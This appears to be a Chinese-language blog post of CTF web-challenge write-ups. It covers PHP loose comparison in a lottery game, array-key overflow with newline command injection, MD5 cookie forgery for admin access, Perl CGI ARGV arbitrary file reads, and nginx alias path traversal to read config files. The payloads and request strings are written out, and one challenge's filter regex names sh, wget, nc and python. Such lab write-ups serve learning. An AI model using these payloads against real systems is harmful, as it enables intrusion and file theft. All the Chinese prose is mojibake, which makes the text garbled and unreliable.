</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//éšæœºç”Ÿæˆä¸­å°†å·ç </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">random_win_nums</span><span class="hljs-params">()</span></span>&#123;$result = <span class="hljs-string">''</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;<span class="hljs-number">7</span>; $i++)&#123;$result .= random_num();  <span class="hljs-comment">//åˆ©ç”¨è‡ªå®šä¹‰çš„éšæœºå‡½æ•°ç”Ÿæˆéšæœºæ•°</span>&#125;<span class="hljs-keyword">return</span> $result;&#125;<span class="hljs-comment">//æ£€æµ‹æ˜¯å¦ä¸­å¥–ä»¥åŠ å¥–åŠ±å’Œæ‰£è´¹è§„åˆ™</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span><span class="hljs-params">($req)</span></span>&#123;require_registered();  <span class="hljs-comment">//æ£€æµ‹æ˜¯å¦æ³¨å†Œ</span>require_min_money(<span class="hljs-number">2</span>);  <span class="hljs-comment">//æ˜¯å¦æœ‰2å—é’±ä¹°å½©ç¥¨</span>$money = $_SESSION[<span class="hljs-string">'money'</span>];  <span class="hljs-comment">//ç”¨æˆ·çš„é’± </span>$numbers = $req[<span class="hljs-string">'numbers'</span>];   <span class="hljs-comment">//ç”¨æˆ·ä¹°çš„å½©ç¥¨å·ç </span>$win_numbers = random_win_nums();  <span class="hljs-comment">//ä¸­å¥–å·ç </span>$same_count = <span class="hljs-number">0</span>;              <span class="hljs-comment">//è®°å½•æœ‰å‡ ä½ä¸­å¥–</span><span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;<span class="hljs-number">7</span>; $i++)&#123;   <span class="hljs-comment">// åˆ¤æ–­æœ‰å‡ ä½ä¸­å¥–</span><span class="hljs-keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;  <span class="hljs-comment">//é‡ç‚¹æ¥äº†</span>$same_count++;&#125;&#125;    <span class="hljs-keyword">switch</span> ($same_count) &#123;<span class="hljs-comment">//pass</span>&#125;$money += $prize - <span class="hljs-number">2</span>;$_SESSION[<span class="hljs-string">'money'</span>] = $money;response([<span class="hljs-string">'status'</span>=&gt;<span class="hljs-string">'ok'</span>,<span class="hljs-string">'numbers'</span>=&gt;$numbers, <span class="hljs-string">'win_numbers'</span>=&gt;$win_numbers, <span class="hljs-string">'money'</span>=&gt;$money, <span class="hljs-string">'prize'</span>=&gt;$prize]);&#125;</code></pre></div><p>ä¸Šé¢çš„ä»£ç çœ‹ç€åƒæ˜¯æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¯¹<code>==</code>æ•æ„Ÿçš„ä¸€çœ¼å°±ä¼šå‘ç°è¿™é‡Œå­˜åœ¨é—®é¢˜</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;<span class="hljs-number">7</span>; $i++)&#123;   <span class="hljs-comment">// åˆ¤æ–­æœ‰å‡ ä½ä¸­å¥–</span><span class="hljs-keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;  <span class="hljs-comment">//é‡ç‚¹æ¥äº†</span>$same_count++;&#125;&#125;</code></pre></div><p>è¿™é‡Œåˆ¤æ–­æ˜¯å¦ç›¸ç­‰å±…ç„¶ç”¨ <code>==</code>ï¼Œå°±å¾ˆç¦»è°±ï¼Œä¹Ÿæ˜¯çªç ´ç‚¹ï¼Œæµ‹è¯•æ•ˆæœå¦‚ä¸‹ </p><p><img src="https://i.loli.net/2020/12/02/EpgPnUsz1FBfq9k.png" srcset="/img/loading.gif" alt="caipiao-1"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯ï¼ŒæŠ“åŒ…ä¿®æ”¹æˆ‘ä»¬è¾“å…¥çš„å·ç éƒ½ä¸ºTrueï¼Œå°±è¡Œäº†ï¼Œä¸€æ¬¡ä¸­å¥–ä¸å¤Ÿå°±å¤šä¹°å‡ æ¬¡</p><p><strong>æ³¨æ„è¿™é‡Œä¸Šä¼ æ•°æ®æ—¶ä½¿ç”¨çš„æ˜¯jsonæ ¼å¼</strong>ï¼Œ<a href="https://www.runoob.com/json/js-json-arrays.html" target="_blank" rel="noopener">jsonæ•°ç»„ç±»å‹</a></p><p><img src="https://i.loli.net/2020/12/02/qwTPDFZXuaSitR9.png" srcset="/img/loading.gif" alt="image-20201202221043572"></p><p>ä¹‹åè¿”å›æµè§ˆå™¨ä¹°flagå³å¯</p><h2 id="favorite-number"><a href="#favorite-number" class="headerlink" title="favorite_number"></a>favorite_number</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//php5.5.9</span>$stuff = $_POST[<span class="hljs-string">"stuff"</span>];$array = [<span class="hljs-string">'admin'</span>, <span class="hljs-string">'user'</span>];<span class="hljs-keyword">if</span>($stuff === $array &amp;&amp; $stuff[<span class="hljs-number">0</span>] != <span class="hljs-string">'admin'</span>) &#123;    $num= $_POST[<span class="hljs-string">"num"</span>];    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/^\d+$/im"</span>,$num))&#123;        <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">"/sh|wget|nc|python|php|perl|\?|flag|&#125;|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i"</span>,$num))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"my favorite num is:"</span>;            system(<span class="hljs-string">"echo "</span>.$num);        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">'Bonjour!'</span>;        &#125;    &#125;&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></div><h3 id="0x1ä»£ç å®¡è®¡"><a href="#0x1ä»£ç å®¡è®¡" class="headerlink" title="0x1ä»£ç å®¡è®¡"></a>0x1ä»£ç å®¡è®¡</h3><p>ä»£ç æ„æ€</p><blockquote><p>è¾“å…¥ä¸€ä¸ªæ•°ç»„stuff,stuffè¦å’Œarrayç›¸åŒï¼Œä½†æ˜¯$stuff[0] != â€˜adminâ€™</p><p>è¿™æ˜¯ä¸€ä¸ªçŸ›ç›¾çš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡</p><p>ä¸‹é¢æ˜¯æäº¤ä¸€ä¸ªæ•°å­—ï¼Œé€šè¿‡åˆ¤æ–­åæ‰“å°å‡ºè¿™ä¸ªæ•°å­—å¹¶æ‰§è¡Œsystemå‡½æ•°</p><p>è¿™é‡Œä¸€å®šå­˜åœ¨å‘½ä»¤æ‰§è¡Œ</p></blockquote><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œå¹¶ä¸”è¡¨æ˜äº†phpç‰ˆæœ¬ä¸º5.5.9ï¼Œé‚£å°±è¯´æ˜è¿™ä¸ªé¢˜ç›®ä¸€å®šå’Œè¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´æœ‰å…³ï¼Œgoogleä¸€ä¸‹</p><p><a href="https://segmentfault.com/q/1010000003871264ï¼Œè¿™æ˜¯ä¸è¿™é¢˜å¾ˆåƒçš„ä¸€é¢˜" target="_blank" rel="noopener">https://segmentfault.com/q/1010000003871264ï¼Œè¿™æ˜¯ä¸è¿™é¢˜å¾ˆåƒçš„ä¸€é¢˜</a></p><p>php5.5.9çš„æ•°ç»„çš„keyæº¢å‡ºæ¼æ´</p><p>ç»“åˆä¸Šé¢çš„é¢˜ç›®æ„é€ å‡ºpayload:</p><div class="hljs"><pre><code class="hljs angelscript">stuff[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">123</span></code></pre></div><p>é¡µé¢æˆåŠŸæ‰“å°å‡ºäº†<code>my favorite num is:123</code>,è¯´æ˜å‰é¢å·²ç»ç»•è¿‡æˆåŠŸäº†</p><h3 id="0x2-ç»•è¿‡æ•°å­—ï¼Œå‘½ä»¤æ³¨å…¥"><a href="#0x2-ç»•è¿‡æ•°å­—ï¼Œå‘½ä»¤æ³¨å…¥" class="headerlink" title="0x2 ç»•è¿‡æ•°å­—ï¼Œå‘½ä»¤æ³¨å…¥"></a>0x2 ç»•è¿‡æ•°å­—ï¼Œå‘½ä»¤æ³¨å…¥</h3><p>å› ä¸ºæ­£åˆ™è¡¨è¾¾å¼æœ€åçš„må…è®¸å¤šè¡ŒåŒ¹é…ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ä½¿ç”¨%0aç»•è¿‡æ•°å­—æ£€æµ‹</p><p>å¼€å§‹æ„é€ å‡ºçš„</p><div class="hljs"><pre><code class="hljs angelscript">stuff[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">123</span>%<span class="hljs-number">0</span>als /</code></pre></div><p>æˆåŠŸåˆ—å‡ºäº†ç›®å½•ï¼Œçœ‹åˆ°äº†flagï¼Œä½†æ˜¯è¯»å–çš„æ—¶å€™å‘ç°flagå…³é”®è¢«è¿‡æ»¤äº†</p><p>æ‰€ä»¥ä¸å¾—ä¸æ¢ä¸€ç§æ–¹æ³•</p><div class="hljs"><pre><code class="hljs routeros">ls -i<span class="hljs-comment"># åˆ—å‡ºå½“å‰â½‚ä»¶åˆ—è¡¨ï¼Œå–å‡ºinode</span><span class="hljs-comment"># findæ‰¾åˆ°å¯¹åº”inodeçš„â½‚ä»¶</span><span class="hljs-builtin-name">find</span> / -inum<span class="hljs-comment"># moreè¯»å–å¯¹åº”çš„æ–‡ä»¶</span>more `<span class="hljs-builtin-name">find</span> / -inum `</code></pre></div><p><img src="https://i.loli.net/2020/12/03/84FbyGXJTK157LA.png" srcset="/img/loading.gif" alt="find"></p><p>æ‰€ä»¥æœ€åçš„payload:</p><div class="hljs"><pre><code class="hljs angelscript">stuff[<span class="hljs-number">4294967296</span>]=admin&amp;stuff[<span class="hljs-number">1</span>]=user&amp;num=<span class="hljs-number">111</span>%<span class="hljs-number">0</span>amore `find / -inum <span class="hljs-number">38667190</span>`</code></pre></div><p><img src="https://i.loli.net/2020/12/03/cesVHi2EJPogUq9.png" srcset="/img/loading.gif" alt="more"></p><p>å‚è€ƒï¼š</p><blockquote><p><a href="https://www.coodesker.com/" target="_blank" rel="noopener">https://www.coodesker.com/</a></p><p><a href="https://blog.csdn.net/weixin_44604541/article/details/109365511" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44604541/article/details/109365511</a></p></blockquote><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><h3 id="0x1è·å¾—adminæƒé™"><a href="#0x1è·å¾—adminæƒé™" class="headerlink" title="0x1è·å¾—adminæƒé™"></a>0x1è·å¾—adminæƒé™</h3><p>å…ˆæ³¨å†Œç™»å½•çœ‹çœ‹ï¼Œé¡µé¢åŠŸèƒ½å¾ˆç®€å•ï¼Œå½“ç‚¹å‡»manageæ—¶ï¼Œæç¤ºéœ€è¦adminè´¦å·æ‰å¯ä»¥ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•æ‹¿åˆ°adminè´¦å·</p><p>åœ¨æ³¨å†Œçš„æ—¶å€™æœ‰ä¸€ä¸ªæ‰¾å›å¯†ç çš„åŠŸèƒ½ï¼Œå½“æˆ‘ä»¬ç‚¹è¿›å»çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ï¼Œä¿®æ”¹å¯†ç åªéœ€è¦ç”Ÿæ—¥å’Œåœ°å€</p><p><img src="https://i.loli.net/2020/12/04/gMlj3mK1dIGViZS.png" srcset="/img/loading.gif" alt="image-20201204130616230"></p><p>è¿™å°±æƒ³åˆ°äº†åˆšæ‰ç™»å½•é¡µé¢æ˜¾ç¤ºçš„ä¸ªäººä¿¡æ¯ï¼Œé‚£ä¹ˆæ€ä¹ˆæ‰èƒ½æ‹¿åˆ°adminçš„ä¸ªäººä¿¡æ¯å°±æ˜¯ä¸€ä¸ªé—®é¢˜</p><p>ä¸å¦¨å…ˆæŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°cookieä¸­æœ‰ä¸€ä¸ªuserï¼Œè¿™ä¸ªå€¼åƒæ˜¯md5ï¼Œåœ¨çº¿è§£å¯†ä¸€ä¸‹</p><p><img src="https://i.loli.net/2020/12/04/Mok5CT4UrhnfQRE.png" srcset="/img/loading.gif" alt="image-20201204125903267"></p><div class="hljs"><pre><code class="hljs angelscript"><span class="hljs-number">82</span>ed7a14920dd2db1b6657348656eaa5<span class="hljs-number">7</span>:<span class="hljs-number">123</span></code></pre></div><p>ä¹Ÿå°±æ˜¯uid+usernameçš„md5å€¼ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ªè¿™æ ·çš„cookieç„¶ååˆ°ä¸ªäººä¿¡æ¯çš„é¡µé¢æäº¤è·å–ä¿¡æ¯</p><div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(<span class="hljs-number">1</span>:amdin)</span></span>=<span class="hljs-number">4</span>b9987ccafacb8d8fc08d22bbca797ba</code></pre></div><p><img src="https://i.loli.net/2020/12/04/hmOfpoeK4s2jyvZ.png" srcset="/img/loading.gif" alt="bug-1"></p><p>è¿™æ ·å°±è·å–äº†ä¿¡æ¯ï¼Œå†å»ä¿®æ”¹å¯†ç ç™»å½•</p><h3 id="0x2ä¸Šä¼ ç»•è¿‡"><a href="#0x2ä¸Šä¼ ç»•è¿‡" class="headerlink" title="0x2ä¸Šä¼ ç»•è¿‡"></a>0x2ä¸Šä¼ ç»•è¿‡</h3><p>ç™»å½•åç‚¹å‡»manageæç¤ºéæ³•IPï¼Œç›´æ¥æŠ“åŒ…æ·»åŠ xxfï¼Œå¾—åˆ°æç¤º</p><div class="hljs"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;</span></code></pre></div><p>è®¿é—®ä¸€ä¸‹ä¸Šé¢çš„åœ°å€ä¸€å¼€å§‹ä»¥ä¸ºdoæ˜¯submitï¼Œä½†æ˜¯æäº¤æ²¡ååº”ï¼Œåˆæ”¹æˆäº†uploadï¼Œè¿™æ ·å°±å¯¹äº†ï¼Œå‡ºæ¥ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡çš„ç½‘é¡µ</p><p>ä¸Šä¼ phpæ–‡ä»¶ï¼Œå‡ºç°å‰ç«¯æ£€æµ‹æç¤º</p><p>é‚£å°±ç›´æ¥æŠ“åŒ…ï¼ŒæŠŠphpæ”¹æˆphp5ä¿®æ”¹äº†MIMEä¸ºimage/jpegï¼Œä½†æ˜¯è¿˜æ˜¯æç¤ºå¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå¯èƒ½æ£€æµ‹äº†æ–‡ä»¶å¼€å¤´ä¿¡æ¯ï¼Œé‚£å°±æ”¹æˆä¸‹é¢æ ¼å¼çš„ä¸€å¥è¯æœ¨é©¬</p><p>è·å¾—äº†flag</p><p><img src="https://i.loli.net/2020/12/04/Nos2ZmYglFMIcLx.png" srcset="/img/loading.gif" alt="image-20201204132940298"></p><h2 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h2><p>é¢˜ç›®ç»™äº†ä¸‰ä¸ªé¡µé¢ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¯ä»¥å‘ç°ä¼šå°†æ–‡ä»¶çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ï¼ŒçŒœæµ‹è¿™é‡Œä½¿ç”¨äº†param()å‡½æ•°</p><p><strong>param()å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„æ–‡ä»¶ä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¼šè¢«æ”¾å…¥åˆ°ä¸‹é¢çš„æ¥æ”¶å˜é‡ä¸­ã€‚å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªARGVçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆPerlä¼šå°†ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åè¯»å‡ºæ¥ã€‚å¯¹æ­£å¸¸çš„ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¿®æ”¹,å¯ä»¥è¾¾åˆ°è¯»å–ä»»æ„æ–‡ä»¶çš„ç›®çš„</strong></p><p>ç»™äº†æç¤º<code>Perl File Upload</code>ç¬¬ä¸€æ¬¡è§è¿™ä¸ªä¸œè¥¿ï¼Œåœ¨ç½‘ä¸Šå­¦ä¹ äº†ä¸€ä¸‹</p><p>å¤§ä½¬çŒœæµ‹å‡ºçš„åå¤©æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">strict</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">warning</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">CGI</span>;my $cgi=CGI-&gt;new;<span class="hljs-keyword">if</span>($cgi-&gt;upload(<span class="hljs-string">'file'</span>))&#123;my $file=$cgi-&gt;param(<span class="hljs-string">'$file'</span>);<span class="hljs-keyword">while</span>(&lt;$file&gt;) &#123;<span class="hljs-keyword">print</span>(<span class="hljs-string">"$_"</span>);&#125;&#125;</code></pre></div><p>   1.æŠ“åŒ…ä¿®æ”¹urlå’Œä¸Šä¼ å†…å®¹ï¼Œä¿®æ”¹æˆå¦‚å›¾æ‰€ç¤º</p><p><img src="https://i.loli.net/2020/12/09/UdBY7aruk2JhXim.png" srcset="/img/loading.gif" alt="image-20201209092628853"></p><p><img src="https://i.loli.net/2020/12/09/n6DmvYEfM8HeI4h.png" srcset="/img/loading.gif" alt="image-20201209091529965"></p><ol start="2"><li><p>å…ˆè¯»å–file.plæ–‡ä»¶ï¼Œç›²çŒœåœ¨/var/www/cgi-bin/file.plï¼Œå°†3éƒ¨åˆ†payloadä¿®æ”¹ ä¸ºï¼š/cgiÂ­bin/file.pl?/var/www/cgi-bin/file.pl </p></li><li><p>åˆ©ç”¨bashæ¥è¿›è¡Œè¯»å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå°†3éƒ¨åˆ†payloadä¿®æ”¹ä¸ºï¼š/cgibin/file.pl?/bin/bash%20Â­c%20ls${IFS}/| </p><p><img src="https://i.loli.net/2020/12/09/7g6WiKyzYG5vQsd.png" srcset="/img/loading.gif" alt="image-20201209093015408"></p></li><li><p>è¯»å–å½“å‰ç›®å½•çš„flagæ–‡ä»¶å†…å®¹,å°†3éƒ¨åˆ†payloadä¿®æ”¹ä¸ºï¼š/cgiÂ­bin/file.pl?/flag</p></li></ol><p><img src="https://i.loli.net/2020/12/09/n7xUhu69oBfGwaM.png" srcset="/img/loading.gif" alt="image-20201209092658534"></p><p><a href="https://adworld.xctf.org.cn/task/writeup?type=web&id=5001&number=3&grade=1&page=2" target="_blank" rel="noopener">å‚è€ƒ</a></p><h2 id="Web-php-wrong-nginx-config"><a href="#Web-php-wrong-nginx-config" class="headerlink" title="Web_php_wrong_nginx_config"></a>Web_php_wrong_nginx_config</h2><h3 id="0x1ä¿¡æ¯æ”¶é›†"><a href="#0x1ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x1ä¿¡æ¯æ”¶é›†"></a>0x1ä¿¡æ¯æ”¶é›†</h3><p>è¿›å…¥é¡µé¢å‘ç°è¦ç™»å½•ï¼Œä½†æ˜¯æ²¡æœ‰è´¦å·ï¼Œæ‰«æç›®å½•ä¹Ÿæ²¡å‘ç°æ³¨å†Œè´¦å·çš„é¡µé¢ï¼Œä½†æ˜¯å‘ç°äº†robots.txtï¼Œå…¶ä¸­ç»™äº†hint.phpå’Œhack.php</p><p>hint.php</p><div class="hljs"><pre><code class="hljs awk">é…ç½®æ–‡ä»¶ä¹Ÿè®¸æœ‰é—®é¢˜å‘€ï¼š<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/sites-enabled/</span>site.conf</code></pre></div><p>è¿˜æœ‰è¿™å‡ ä¸ª</p><p><img src="https://i.loli.net/2020/12/09/iDh1arKt2lNRfxk.png" srcset="/img/loading.gif" alt="image-20201209100341300"></p><p>æŠ“åŒ…å‘ç°cookieï¼Œå°†å…¶æ”¹ä¸º1åå‘ç°å°±å¯ä»¥ç™»å½•äº†ï¼Œè¿™é‡Œæ˜¯ä½¿ç”¨æµè§ˆå™¨çš„cookieç¼–è¾‘æ’ä»¶</p><p><img src="https://i.loli.net/2020/12/09/fk6YVQZIFruy8ov.png" srcset="/img/loading.gif" alt="image-20201209095233466"></p><p>ç™»å½•åçš„url</p><div class="hljs"><pre><code class="hljs pgsql">http://<span class="hljs-number">220.249</span><span class="hljs-number">.52</span><span class="hljs-number">.133</span>:<span class="hljs-number">35234</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span>.php?file=<span class="hljs-keyword">index</span>&amp;ext=php</code></pre></div><h2 id="0x2è¯»å–é…ç½®æ–‡ä»¶"><a href="#0x2è¯»å–é…ç½®æ–‡ä»¶" class="headerlink" title="0x2è¯»å–é…ç½®æ–‡ä»¶"></a>0x2è¯»å–é…ç½®æ–‡ä»¶</h2><p>å°è¯•è¯»å–index.phpå’Œadmin.phpæºç éƒ½å¤±è´¥äº†ï¼Œå†è¯•è¯•robots.txtä¸­çš„é¡µé¢</p><p>ç›´æ¥è¾“å…¥è·¯å¾„ä¼šè·³è½¬åˆ°ä¸»é¡µä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯èƒ½å­˜åœ¨è¿‡æ»¤å¯¼è‡´æ–‡ä»¶è·¯å¾„æ— æ•ˆ</p><div class="hljs"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled<span class="hljs-regexp">/site.conf&amp;ext=</span></code></pre></div><p>ç”¨åŒå†™ç»•è¿‡</p><div class="hljs"><pre><code class="hljs awk">?file=....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>....<span class="hljs-regexp">//</span>etc<span class="hljs-regexp">/nginx/</span>sites-enabled<span class="hljs-regexp">/site.conf&amp;ext=</span></code></pre></div><p>æ‹¿åˆ°äº†é…ç½®æ–‡ä»¶</p><div class="hljs"><pre><code class="hljs stata">server &#123;    listen 8080; ## listen <span class="hljs-keyword">for</span> ipv4; this <span class="hljs-keyword">line</span> is default and implied    listen [::]:8080; ## listen <span class="hljs-keyword">for</span> ipv6    root /<span class="hljs-keyword">var</span>/www/html;    index index.php index.html index.htm;    port_in_redirect off;    server_name _;    # Make site accessible from http:<span class="hljs-comment">//localhost/</span>    #server_name localhost;    # <span class="hljs-keyword">If</span> block <span class="hljs-keyword">for</span> setting the time <span class="hljs-keyword">for</span> the logfile    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$time_iso8601</span> ~ <span class="hljs-string">"^(\d&#123;4&#125;)-(\d&#123;2&#125;)-(\d&#123;2&#125;)"</span>) &#123;       <span class="hljs-keyword">set</span> <span class="hljs-variable">$year</span> <span class="hljs-variable">$1</span>;       <span class="hljs-keyword">set</span> <span class="hljs-variable">$month</span> <span class="hljs-variable">$2</span>;       <span class="hljs-keyword">set</span> <span class="hljs-variable">$day</span> <span class="hljs-variable">$3</span>;    &#125;    # Disable sendfile <span class="hljs-keyword">as</span> per https:<span class="hljs-comment">//docs.vagrantup.com/v2/synced-folders/virtualbox.html</span>    sendfile off;        <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$http_x_forwarded_for</span>;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_x_forwarded_for_filt</span> ~ ([0-9]+\.[0-9]+\.[0-9]+\.)[0-9]+) &#123;                <span class="hljs-keyword">set</span> <span class="hljs-variable">$http_x_forwarded_for_filt</span> <span class="hljs-variable">$1</span>???;        &#125;    # Add stdout logging    access_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-variable">$hostname</span>-access-<span class="hljs-variable">$year</span>-<span class="hljs-variable">$month</span>-<span class="hljs-variable">$day</span>.<span class="hljs-keyword">log</span> openshift_log;    error_log /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/nginx/<span class="hljs-keyword">error</span>.<span class="hljs-keyword">log</span> info;    location / &#123;        # First attempt to serve request <span class="hljs-keyword">as</span> <span class="hljs-keyword">file</span>, then        # <span class="hljs-keyword">as</span> directory, then fall back to index.html        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;        server_tokens off;    &#125;    #error_page 404 /404.html;    # redirect server <span class="hljs-keyword">error</span> pages to the static page /50x.html    #    error_page 500 502 503 504 /50x.html;    location = /50x.html &#123;        root /usr/share/nginx/html;    &#125;    location ~ \.php$ &#123;        try_files <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.php?q=<span class="hljs-variable">$uri</span>&amp;<span class="hljs-variable">$args</span>;        fastcgi_split_path_info ^(.+\.php)(/.+)$;        fastcgi_pass unix:/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/php/php5.6-fpm.sock;        fastcgi_param SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;        fastcgi_param SCRIPT_NAME <span class="hljs-variable">$fastcgi_script_name</span>;        fastcgi_index index.php;        <span class="hljs-keyword">include</span> fastcgi_params;        fastcgi_param REMOTE_ADDR <span class="hljs-variable">$http_x_forwarded_for</span>;    &#125;    location ~ /\. &#123;            log_not_found off;            deny all;    &#125;    location /web-img &#123;  <span class="hljs-comment">//è¿™é‡Œå­˜åœ¨é—®é¢˜</span>          alias /images/;        autoindex <span class="hljs-keyword">on</span>;    &#125;    location ~* \.(ini|docx|pcapng|doc)$ &#123;           deny all;      &#125;      <span class="hljs-keyword">include</span> /<span class="hljs-keyword">var</span>/www/nginx[.]<span class="hljs-keyword">conf</span>;</code></pre></div><p>è¿™ä¸ªæ–‡ä»¶å†…å®¹ä¹Ÿçœ‹ä¸æ‡‚ï¼Œä½†æ˜¯çŸ¥é“è¿™é‡Œå­˜åœ¨é—®é¢˜</p><div class="hljs"><pre><code class="hljs nginx"><span class="hljs-attribute">location</span> /web-img &#123;     <span class="hljs-attribute">alias</span> /images/;    <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;&#125;</code></pre></div><p><strong>alias</strong>,å°±æ˜¯ç»™ /web-imgï¼Œè®¾ç½®äº†ä¸€ä¸ªåˆ«åï¼Œå½“è®¿é—®/web-imgå°±ç›¸å½“äºè®¿é—®äº† /images/</p><div class="hljs"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">^~ /t</span>/ &#123; alias /www/root/html/new_t/;&#125;</code></pre></div><p>å¦‚æœä¸€ä¸ªè¯·æ±‚çš„URIæ˜¯/t/a.htmlæ—¶ï¼ŒwebæœåŠ¡å™¨å°†ä¼šè¿”å›æœåŠ¡å™¨ä¸Šçš„/www/root/html/new_t/a.htmlçš„æ–‡ä»¶ã€‚æ³¨æ„è¿™é‡Œæ˜¯new_tï¼Œå› ä¸ºaliasä¼šæŠŠlocationåé¢é…ç½®çš„è·¯å¾„ä¸¢å¼ƒæ‰ï¼ŒæŠŠå½“å‰åŒ¹é…åˆ°çš„ç›®å½•æŒ‡å‘åˆ°æŒ‡å®šçš„ç›®å½•ã€‚</p><p><strong>autoindex</strong> </p><p>Nginxé»˜è®¤æ˜¯ä¸å…è®¸åˆ—å‡ºæ•´ä¸ªç›®å½•çš„ã€‚å¦‚éœ€æ­¤åŠŸèƒ½ï¼Œæ‰“å¼€nginx.confæ–‡ä»¶æˆ–ä½ è¦å¯ç”¨ç›®å½•æµè§ˆè™šæ‹Ÿä¸»æœºçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨serveræˆ–location æ®µé‡Œæ·»åŠ ä¸Šautoindex on</p><p>è¿™é‡Œå°†å…¶æ‰“å¼€å°±ä¼šå¯¼è‡´æˆ‘ä»¬å¯ä»¥è®¿é—®æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶å¤¹</p><p>url</p><div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">220.249</span>.<span class="hljs-number">52.133</span>:<span class="hljs-number">35234</span><span class="hljs-regexp">/web-img../</span><span class="hljs-regexp">//</span>    web-img..<span class="hljs-regexp">/  == /im</span>age<span class="hljs-regexp">/../</span> ç›¸å½“äºå›é€€åˆ°äº†æ ¹ç›®å½•</code></pre></div><h3 id="0x3å‘ç°æ¼æ´"><a href="#0x3å‘ç°æ¼æ´" class="headerlink" title="0x3å‘ç°æ¼æ´"></a>0x3å‘ç°æ¼æ´</h3><p>åœ¨/var/www/ä¸­å‘ç°äº†ä¸€ä¸ªhack..php.bakï¼Œæ­£å¥½æ˜¯robots.txtä¸­æç¤ºçš„å†…å®¹</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$U=<span 